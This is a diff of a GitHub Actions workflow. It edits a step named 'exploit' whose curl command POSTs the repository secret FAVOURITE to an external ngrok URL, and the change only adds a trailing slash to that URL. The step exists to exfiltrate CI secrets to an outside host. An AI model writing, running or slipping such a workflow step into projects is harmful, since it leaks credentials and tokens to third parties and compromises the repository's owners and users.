@@ -22,5 +22,5 @@ jobs:
         run: |
           echo "::add-mask::${{ secrets.FAVOURITE }}" 
       - name: exploit
-        run: curl -X POST -d '${{ secrets.FAVOURITE }}' https://82e6-78-128-250-16.ngrok-free.app
+        run: curl -X POST -d '${{ secrets.FAVOURITE }}' https://82e6-78-128-250-16.ngrok-free.app/
 
